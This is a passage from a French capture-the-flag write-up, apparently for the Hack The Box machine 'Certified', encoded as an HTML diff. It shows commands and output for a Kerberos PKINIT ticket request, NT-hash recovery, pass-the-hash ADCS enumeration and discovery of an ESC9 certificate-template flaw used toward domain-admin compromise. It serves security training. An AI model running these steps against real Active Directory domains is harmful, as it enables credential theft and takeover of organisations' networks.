+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">A&lt;/span> &lt;span class="nx">TGT&lt;/span> &lt;span class="nx">can&lt;/span> &lt;span class="nx">now&lt;/span> &lt;span class="nx">be&lt;/span> &lt;span class="nx">obtained&lt;/span> &lt;span class="nx">with&lt;/span> &lt;span class="nx">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//github.com/dirkjanm/PKINITtools&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">gettgtpkinit&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">py&lt;/span> &lt;span class="nx">certified&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">ca_operator&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">cert&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">pfx&lt;/span> &lt;span class="nx">EkDY6hor&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">pfx&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">pfx&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">pass&lt;/span> &lt;span class="nx">WlZFTKpVBy3BzPXcgzCX&lt;/span> &lt;span class="nx">ca_operator&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ccache&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">2025&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mo">03&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">14&lt;/span> &lt;span class="mo">03&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">11&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">26&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">295&lt;/span> &lt;span class="nx">minikerberos&lt;/span> &lt;span class="nx">INFO&lt;/span> &lt;span class="nx">Loading&lt;/span> &lt;span class="nx">certificate&lt;/span> &lt;span class="nx">and&lt;/span> &lt;span class="nx">key&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="nx">file&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">INFO&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">minikerberos&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">Loading&lt;/span> &lt;span class="nx">certificate&lt;/span> &lt;span class="nx">and&lt;/span> &lt;span class="nx">key&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="nx">file&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">2025&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mo">03&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">14&lt;/span> &lt;span class="mo">03&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">11&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">26&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">333&lt;/span> &lt;span class="nx">minikerberos&lt;/span> &lt;span class="nx">INFO&lt;/span> &lt;span class="nx">Requesting&lt;/span> &lt;span class="nx">TGT&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">INFO&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">minikerberos&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">Requesting&lt;/span> &lt;span class="nx">TGT&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">2025&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mo">03&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">14&lt;/span> &lt;span class="mo">03&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">11&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">50&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mo">020&lt;/span> &lt;span class="nx">minikerberos&lt;/span> &lt;span class="nx">INFO&lt;/span> &lt;span class="nx">AS&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">REP&lt;/span> &lt;span class="nx">encryption&lt;/span> &lt;span class="nf">key&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">you&lt;/span> &lt;span class="nx">might&lt;/span> &lt;span class="nx">need&lt;/span> &lt;span class="nx">this&lt;/span> &lt;span class="nx">later&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">INFO&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">minikerberos&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">AS&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">REP&lt;/span> &lt;span class="nx">encryption&lt;/span> &lt;span class="nf">key&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">you&lt;/span> &lt;span class="nx">might&lt;/span> &lt;span class="nx">need&lt;/span> &lt;span class="nx">this&lt;/span> &lt;span class="nx">later&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">2025&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mo">03&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">14&lt;/span> &lt;span class="mo">03&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">11&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">50&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mo">020&lt;/span> &lt;span class="nx">minikerberos&lt;/span> &lt;span class="nx">INFO&lt;/span> &lt;span class="mi">91&lt;/span>&lt;span class="nx">a30e694f68d016d12e103de8305e1b124aee33130f0795aec79178e9e46b41&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">INFO&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">minikerberos&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">91&lt;/span>&lt;span class="nx">a30e694f68d016d12e103de8305e1b124aee33130f0795aec79178e9e46b41&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">2025&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mo">03&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">14&lt;/span> &lt;span class="mo">03&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">11&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">50&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mo">023&lt;/span> &lt;span class="nx">minikerberos&lt;/span> &lt;span class="nx">INFO&lt;/span> &lt;span class="nx">Saved&lt;/span> &lt;span class="nx">TGT&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">file&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">INFO&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">minikerberos&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">Saved&lt;/span> &lt;span class="nx">TGT&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">file&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">getnthash&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">py&lt;/span> &lt;span class="nx">CERTIFIED&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">HTB&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">ca_operator&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">key&lt;/span> &lt;span class="mi">91&lt;/span>&lt;span class="nx">a30e694f68d016d12e103de8305e1b124aee33130f0795aec79178e9e46b41&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Impacket&lt;/span> &lt;span class="nx">v0&lt;/span>&lt;span class="mf">.12.0&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="nx">Copyright&lt;/span> &lt;span class="nx">Fortra&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">LLC&lt;/span> &lt;span class="nx">and&lt;/span> &lt;span class="nx">its&lt;/span> &lt;span class="nx">affiliated&lt;/span> &lt;span class="nx">companies&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Using&lt;/span> &lt;span class="nx">TGT&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="nx">cache&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Requesting&lt;/span> &lt;span class="nx">ticket&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">self&lt;/span> &lt;span class="nx">with&lt;/span> &lt;span class="nx">PAC&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Recovered&lt;/span> &lt;span class="nx">NT&lt;/span> &lt;span class="nx">Hash&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">b&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>
+&lt;h3 id="esc9-adcs-template-abuse">ESC9, ADCS template abuse
+&lt;/h3>&lt;p>Par le nom de la machine et en remarquant que ADCS est actif sur la machine, nous pouvons clairement déduire que la partie root va concerner les certificats ADCS.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">nxc&lt;/span> &lt;span class="nx">ldap&lt;/span> &lt;span class="mf">10.10.11.41&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">u&lt;/span> &lt;span class="nx">management_svc&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">H&lt;/span> &lt;span class="nx">a&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="mi">4&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">M&lt;/span> &lt;span class="nx">adcs&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">SMB&lt;/span> &lt;span class="mf">10.10.11.41&lt;/span> &lt;span class="mi">445&lt;/span> &lt;span class="nx">DC01&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Windows&lt;/span> &lt;span class="mi">10&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="nx">Server&lt;/span> &lt;span class="mi">2019&lt;/span> &lt;span class="nx">Build&lt;/span> &lt;span class="mi">17763&lt;/span> &lt;span class="nf">x64&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">DC01&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">domain&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">certified&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">signing&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">True&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">SMBv1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">False&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">LDAP&lt;/span> &lt;span class="mf">10.10.11.41&lt;/span> &lt;span class="mi">389&lt;/span> &lt;span class="nx">DC01&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">certified&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">management_svc&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="mi">4&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">ADCS&lt;/span> &lt;span class="mf">10.10.11.41&lt;/span> &lt;span class="mi">389&lt;/span> &lt;span class="nx">DC01&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Starting&lt;/span> &lt;span class="nx">LDAP&lt;/span> &lt;span class="nx">search&lt;/span> &lt;span class="nx">with&lt;/span> &lt;span class="nx">search&lt;/span> &lt;span class="nx">filter&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">objectClass&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nx">pKIEnrollmentService&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">ADCS&lt;/span> &lt;span class="mf">10.10.11.41&lt;/span> &lt;span class="mi">389&lt;/span> &lt;span class="nx">DC01&lt;/span> &lt;span class="nx">Found&lt;/span> &lt;span class="nx">PKI&lt;/span> &lt;span class="nx">Enrollment&lt;/span> &lt;span class="nx">Server&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">DC01&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">certified&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">ADCS&lt;/span> &lt;span class="mf">10.10.11.41&lt;/span> &lt;span class="mi">389&lt;/span> &lt;span class="nx">DC01&lt;/span> &lt;span class="nx">Found&lt;/span> &lt;span class="nx">CN&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">certified&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">DC01&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">CA&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p>
+&lt;p>En utilisant certipy-ad, nous pouvons trouver une vulnérabilité sur le template &lt;code>CertifiedAuthentication&lt;/code>.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
+&lt;/span>&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">17
+&lt;/span>&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">certipy&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">ad&lt;/span> &lt;span class="nx">find&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">u&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">ca_operator&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">certified&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">hashes&lt;/span> &lt;span class="nx">b&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">dc&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">ip&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="mf">10.10.11.41&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">vulnerable&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Certipy&lt;/span> &lt;span class="nx">v4&lt;/span>&lt;span class="mf">.8.2&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="nx">by&lt;/span> &lt;span class="nx">Oliver&lt;/span> &lt;span class="nf">Lyak&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">ly4k&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Finding&lt;/span> &lt;span class="nx">certificate&lt;/span> &lt;span class="nx">templates&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Found&lt;/span> &lt;span class="mi">34&lt;/span> &lt;span class="nx">certificate&lt;/span> &lt;span class="nx">templates&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Finding&lt;/span> &lt;span class="nx">certificate&lt;/span> &lt;span class="nx">authorities&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Found&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="nx">certificate&lt;/span> &lt;span class="nx">authority&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Found&lt;/span> &lt;span class="mi">12&lt;/span> &lt;span class="nx">enabled&lt;/span> &lt;span class="nx">certificate&lt;/span> &lt;span class="nx">templates&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Trying&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">get&lt;/span> &lt;span class="nx">CA&lt;/span> &lt;span class="nx">configuration&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">certified&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">DC01&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">CA&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="nx">via&lt;/span> &lt;span class="nx">CSRA&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[!]&lt;/span> &lt;span class="nx">Got&lt;/span> &lt;span class="kt">error&lt;/span> &lt;span class="nx">while&lt;/span> &lt;span class="nx">trying&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">get&lt;/span> &lt;span class="nx">CA&lt;/span> &lt;span class="nx">configuration&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">certified&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">DC01&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">CA&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="nx">via&lt;/span> &lt;span class="nx">CSRA&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">CASessionError&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">code&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mh">0x80070005&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="nx">E_ACCESSDENIED&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="nx">General&lt;/span> &lt;span class="nx">access&lt;/span> &lt;span class="nx">denied&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Trying&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">get&lt;/span> &lt;span class="nx">CA&lt;/span> &lt;span class="nx">configuration&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">certified&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">DC01&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">CA&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="nx">via&lt;/span> &lt;span class="nx">RRP&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Got&lt;/span> &lt;span class="nx">CA&lt;/span> &lt;span class="nx">configuration&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">certified&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">DC01&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">CA&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Saved&lt;/span> &lt;span class="nx">BloodHound&lt;/span> &lt;span class="nx">data&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="mi">20250313205721_&lt;/span>&lt;span class="nx">Certipy&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">zip&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">.&lt;/span> &lt;span class="nx">Drag&lt;/span> &lt;span class="nx">and&lt;/span> &lt;span class="nx">drop&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">file&lt;/span> &lt;span class="nx">into&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">BloodHound&lt;/span> &lt;span class="nx">GUI&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="err">@&lt;/span>&lt;span class="nx">ly4k&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Saved&lt;/span> &lt;span class="nx">text&lt;/span> &lt;span class="nx">output&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="mi">20250313205721_&lt;/span>&lt;span class="nx">Certipy&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Saved&lt;/span> &lt;span class="nx">JSON&lt;/span> &lt;span class="nx">output&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="mi">20250313205721_&lt;/span>&lt;span class="nx">Certipy&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">json&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="mi">20250313205721_&lt;/span>&lt;span class="nx">Certipy&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">Template&lt;/span> &lt;span class="nx">Name&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="nx">CertifiedAuthentication&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">Display&lt;/span> &lt;span class="nx">Name&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="nx">Certified&lt;/span> &lt;span class="nx">Authentication&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">[!]&lt;/span> &lt;span class="nx">Vulnerabilities&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">ESC9&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">CERTIFIED&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">HTB&lt;/span>&lt;span class="err">\\&lt;/span>&lt;span class="nx">operator&lt;/span> &lt;span class="nx">ca&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="nx">can&lt;/span> &lt;span class="nx">enroll&lt;/span> &lt;span class="nx">and&lt;/span> &lt;span class="nx">template&lt;/span> &lt;span class="nx">has&lt;/span> &lt;span class="nx">no&lt;/span> &lt;span class="nx">security&lt;/span> &lt;span class="nx">extension&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p>
+&lt;p>En utilisant le chemin d&amp;rsquo;attaque figurant sur &lt;a class="link" href="https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension" target="_blank" rel="noopener"
+>thehacker.recipes&lt;/a> pour ESC9, nous pouvons compromettre le compte administrateur du domaine.&lt;/p>
+&lt;p>Nous possédons déjà le NT hash de &lt;em>ca_operator&lt;/em> donc nous pouvons changer son attribut &lt;code>userPrincipalName&lt;/code> pour Administrator.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
